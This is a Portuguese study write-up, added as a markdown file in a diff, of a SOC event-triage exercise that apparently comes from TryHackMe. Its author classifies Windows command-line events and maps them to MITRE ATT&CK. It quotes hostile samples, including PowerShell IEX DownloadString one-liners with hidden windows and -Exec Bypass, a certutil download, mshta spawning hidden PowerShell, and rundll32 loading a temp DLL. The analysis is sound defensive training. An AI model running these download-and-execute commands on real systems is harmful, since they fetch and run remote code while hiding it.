@@ -1,0 +1,171 @@
+# Análise de eventos: Malicious ou Not Malicious?
+
+Um dos exercícios mais interessantes que tive o prazer de fazer. Inicialmente, vou colocar minhas anotações sem correções prévias, pois representam meus raciocínios e minhas pesquisas durante a atividade. Depois, vou registrar o que consegui corrigir e aprender durante o processo de filtragem dos eventos.
+
+## 1. Minhas anotações iniciais
+
+### Disk cleanup initiated by user: `cleanmgr.exe /sagerun:1`
+
+Pode ser malicioso, porque esse usuário iniciou uma limpeza de disco. Inicialmente, pensei que não fosse normal um usuário executar uma limpeza de disco.
+
+Porém, isso não é suficiente para classificar a atividade como maliciosa, até porque o comando utilizado é legítimo e não há outras ações externas ou internas que indiquem um possível comportamento malicioso.
+
+Vou classificar como **Not Malicious**, mas com certa cautela, sabendo que, em um cenário corporativo, essa atividade poderia ser investigada mais a fundo para termos certeza.
+
+### WMIC remote process create
+
+```cmd
+wmic /node:WIN-LAB-01 process call create "powershell -NoP -Command IEX(New-Object Net.WebClient).DownloadString('http://cdn.tryhatme.com/assets/bootstrap.ps1')"
+```
+
+O WMIC não é mais utilizado como antes, mas não vou me prender a esse critério. O que chama minha atenção é o comportamento do comando.
+
+Ele cria um processo remotamente. Esse processo chama o PowerShell e utiliza `New-Object` para criar um objeto `Net.WebClient`.
+
+O `IEX` executa o texto recebido como código, sem necessariamente precisar gravar o script em disco.
+
+Além disso, temos o `DownloadString`, que obtém o conteúdo de uma URL. A combinação desses comandos é bastante suspeita.
+
+Por esses motivos, classifico como **Malicious**.
+
+### Certutil download to Public
+
+```cmd
+certutil -urlcache -split -f "https://downloads.tryhatme.com/agents/agent.exe" C:\Users\Public\agent.exe
+```
+
+O `certutil`, por si só, não é um problema, pois é uma ferramenta nativa do Windows.
+
+Ao pesquisar sobre o uso do `certutil` para baixar arquivos para a pasta Public, encontrei informações indicando que essa técnica pode ser utilizada tanto por invasores quanto por administradores de sistemas.
+
+Analisando o comando, ele aparentemente tenta baixar um arquivo chamado `agent.exe` e salvá-lo em `C:\Users\Public\agent.exe`.
+
+Como preciso escolher entre Malicious e Not Malicious, vou classificá-lo como **Malicious**, pois o comportamento me parece suspeito. Entretanto, reconheço que o comando isolado não comprova que o arquivo seja malicioso.
+
+### MSHTA inline JavaScript spawning PowerShell
+
+```cmd
+mshta "javascript:var s=new ActiveXObject('WScript.Shell');s.Run('powershell -NoP -W Hidden -Command \"Start-Process calc.exe\"',0);close();"
+```
+
+Essa é uma técnica que pode ser utilizada por atacantes para iniciar outros processos por meio de scripts. Vamos destrinchar melhor o comando.
+
+- `-W Hidden`: solicita que a janela do PowerShell fique oculta.
+- `-Command`: indica o comando ou script que o PowerShell deve executar.
+- `Start-Process calc.exe`: inicia a calculadora do Windows.
+
+Classifico como **Malicious**, principalmente pela cadeia de execução utilizada para iniciar o PowerShell de forma oculta. Ainda assim, é importante considerar o contexto e o motivo dessa execução.
+
+### Administrator executed: `cmd.exe /c dir C:\Windows\Temp`
+
+Esse evento pode parecer malicioso por ter sido executado pelo Administrator, o que inicialmente gera um ponto de interrogação maior. Porém, é importante prestar atenção ao que o comando realmente faz.
+
+- `cmd.exe /c`: executa um comando e encerra o processo do interpretador.
+- `dir C:\Windows\Temp`: lista o conteúdo da pasta indicada.
+
+Como o comando apenas lista os arquivos do diretório, não há evidências suficientes para classificá-lo como malicioso.
+
+Portanto, classifico como **Not Malicious**.
+
+### PowerShell IEX DownloadString
+
+```powershell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object System.Net.WebClient).DownloadString('https://updates.tryhackme.com/content/payload.ps1')"
+```
+
+Nesse evento, identifiquei alguns comportamentos que merecem atenção:
+
+- `DownloadString`: obtém conteúdo textual de uma URL.
+- `IEX` (`Invoke-Expression`): interpreta e executa o conteúdo como código PowerShell.
+- `-Exec Bypass`: solicita ignorar as restrições da Execution Policy para aquela execução.
+- `-W Hidden`: solicita que a janela fique oculta.
+- `-NoP`: inicia o PowerShell sem carregar o perfil do usuário.
+- `-NonI`: executa o PowerShell sem interação com o usuário.
+
+A combinação desses elementos é bastante suspeita, pois permite obter código remoto e executá-lo sem necessariamente salvar o script em disco, além de solicitar uma janela oculta.
+
+Classifico como **Malicious**.
+
+### PowerShell -EncodedCommand observed
+
+```powershell
+powershell -NoP -NonI -EncodedCommand SQBnAHYAZQBSA...
+```
+
+Assim como em alguns dos eventos anteriores, certos argumentos chamam minha atenção:
+
+- `-NoP`: inicia o PowerShell sem carregar o perfil do usuário.
+- `-NonI`: executa sem interação com o usuário.
+- `-EncodedCommand`: recebe um comando codificado, normalmente em Base64 com codificação UTF-16LE.
+
+O comando codificado dificulta a leitura imediata do conteúdo. Por isso, seria interessante decodificá-lo para entender exatamente o que está sendo executado.
+
+Inicialmente, classifico como **Malicious**, considerando o contexto do exercício e os indícios apresentados. Entretanto, reconheço que a utilização de `-EncodedCommand`, isoladamente, não comprova atividade maliciosa.
+
+### Rundll32 executing temp DLL export
+
+```cmd
+rundll32.exe C:\Windows\Temp\thm_loader.dll,Run
+```
+
+Esse evento me apresenta mais indícios de possível atividade maliciosa, pois o `rundll32.exe` está sendo utilizado para carregar uma DLL localizada em uma pasta temporária e chamar a função exportada `Run`.
+
+O caminho da DLL chama minha atenção, mas seria importante verificar o arquivo, sua origem, seu hash e o processo que iniciou o `rundll32.exe`.
+
+Com as informações disponíveis no exercício, classifico como **Malicious**, mantendo em mente que uma investigação real exigiria mais evidências.
+
+### Scheduled backup using: `backup.exe /create`
+
+Inicialmente, considerei esse evento pouco suspeito, pois o comando sugere a criação de um backup. Porém, como se trata de um exercício sem contexto adicional suficiente, o nome `backup.exe` não garante que o executável realmente seja uma ferramenta legítima de backup.
+
+Por isso, minha classificação inicial passou a ser **Malicious**, como hipótese para o exercício. Em uma investigação real, eu buscaria mais informações sobre o executável, sua localização, assinatura digital, usuário responsável e processo pai antes de concluir.
+
+---
+
+## 2. Correções e aprendizados durante a análise
+
+### Diferenças entre os argumentos do PowerShell
+
+Durante a análise, percebi que precisava distinguir melhor alguns argumentos:
+
+- `-NoP` (`-NoProfile`): inicia o PowerShell sem carregar o perfil do usuário.
+- `-NonI` (`-NonInteractive`): executa sem interação com o usuário.
+- `-W Hidden` (`-WindowStyle Hidden`): solicita que a janela fique oculta.
+- `-EncodedCommand`: recebe um comando codificado, normalmente em Base64 com codificação UTF-16LE.
+
+Esses argumentos podem aparecer em atividades maliciosas, mas não são suficientes, isoladamente, para comprovar que uma execução é maliciosa.
+
+### Diferença entre `IEX` e `DownloadString`
+
+Outro ponto importante foi compreender que esses comandos possuem funções diferentes:
+
+- `DownloadString`: obtém o conteúdo textual de uma URL.
+- `IEX` (`Invoke-Expression`): interpreta e executa esse conteúdo como código PowerShell.
+
+A combinação pode permitir que um script seja executado diretamente na memória, sem precisar salvar o conteúdo do script em um arquivo. Isso não significa que nenhum arquivo será criado durante toda a execução.
+
+### Utilização do MITRE ATT&CK
+
+Também tentei utilizar o MITRE ATT&CK para dar mais sustentação aos meus argumentos. Entretanto, percebi que preciso tomar mais cuidado ao associar técnicas a comportamentos específicos.
+
+Algumas técnicas que considerei relevantes foram:
+
+- **T1059.001 — PowerShell:** execução de comandos e scripts por meio do PowerShell.
+- **T1105 — Ingress Tool Transfer:** transferência de ferramentas ou arquivos para o ambiente, quando esse comportamento é observado.
+- **T1562.001 — Impair Defenses: Disable or Modify Tools:** comportamento relacionado à desativação ou modificação de ferramentas de segurança.
+
+Aprendi que não devo associar automaticamente `-Exec Bypass` à técnica T1562.001 sem considerar o contexto e a finalidade. A opção pode contornar a política de execução do PowerShell, mas essa política não equivale, por si só, a uma proteção antivírus.
+
+O MITRE ATT&CK ajuda a descrever e contextualizar comportamentos, mas a associação precisa estar sustentada pelas evidências encontradas.
+
+## 3. O que aprendi com o exercício
+
+Esse exercício me fez perceber que classificar um evento não consiste apenas em identificar comandos conhecidos ou associar determinadas ferramentas a ataques.
+
+Preciso compreender o que o comando faz, identificar o que chama a atenção e avaliar se existem evidências suficientes para sustentar minha conclusão.
+
+Também percebi que ferramentas legítimas podem ser utilizadas em atividades maliciosas e que comandos suspeitos nem sempre são suficientes para comprovar um ataque.
+
+Por fim, utilizar o MITRE ATT&CK pode ajudar a organizar minha análise, desde que eu não force uma associação apenas porque determinado comando parece suspeito.
+
+Esse exercício foi importante para praticar o raciocínio de triagem e entender que uma classificação precisa ser sustentada por evidências, e não apenas por uma impressão inicial.
